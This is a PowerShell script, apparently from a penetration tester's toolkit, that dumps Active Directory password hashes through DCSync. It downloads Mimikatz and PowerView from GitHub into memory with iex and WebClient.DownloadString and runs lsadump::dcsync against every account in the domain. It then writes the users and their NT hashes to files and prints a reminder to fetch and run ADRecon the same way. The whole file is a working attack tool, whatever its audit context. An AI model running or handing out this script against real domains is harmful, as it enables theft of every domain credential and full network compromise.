# Author: LRVT - https://github.com/l4rm4nd/

# variables
$DATE = $(get-date -f yyyyMMddThhmm)
$PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
$EXT = ".txt"
$LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full" + $EXT
$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes" + $EXT
$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users" + $EXT
$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import" + $EXT

# create directory for storage
Write-Host "[INFO] Creating new directory at $PATH" -ForegroundColor Gray
New-Item -ItemType Directory -Force -Path $PATH | Out-Null

# download mimikatz into memory
Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/nishang/master/Gather/Invoke-Mimikatz.ps1')

# download poweview into memory
Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')

# print out domain context
$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red

$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n):"
if ($confirmation -eq 'y') {
    # execute DCSync to export NT-Hashes
    Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
    Write-Host "    >" $LOG -ForegroundColor Gray
    $command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
    Invoke-Mimikatz -Command $command

    # get NTLM only
    Write-Host "[~] Extracting NT-Hashes from logfile" -ForegroundColor Yellow
    Write-Host "    > " $HASHES -ForegroundColor Gray
    (Get-Content -LiteralPath $LOG) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES

    # get users only
    Write-Host "[~] Extracting users from logfile" -ForegroundColor Yellow
    Write-Host "    > " $USERS -ForegroundColor Gray
    (Get-Content -LiteralPath $LOG) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
    Write-Host ""

    # create import file for customer
    Write-Host "[~] Create user/hash merge file" -ForegroundColor Yellow
    Write-Host "    > " $IMPORTFILE -ForegroundColor Gray
    $File1 = Get-Content $USERS
    $File2 = Get-Content $HASHES
    for($i = 0; $i -lt $File1.Count; $i++)
    {
        ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $IMPORTFILE
    }

    # final message
    Write-Host ""
    Write-Host "[OK] Hash extraction completed" -ForegroundColor Green
    Write-Host ""
    explorer $PATH

    # reminder ADRecon
    Write-Host "[!] Do not forget to run ADRecon" -ForegroundColor Yellow
    Write-Host "    > iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')" -ForegroundColor Gray
    Write-Host "    > Invoke-ADRecon -method LDAP -Collect Users -OutputType Excel -ADROutputDir $PATH" -ForegroundColor Gray
    Write-Host "    > Invoke-ADRecon -GenExcel <CSV-OUTPUT-FILES>" -ForegroundColor Gray
    Write-Host ""
}else{
    Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script (line 21)." -ForegroundColor Red
}
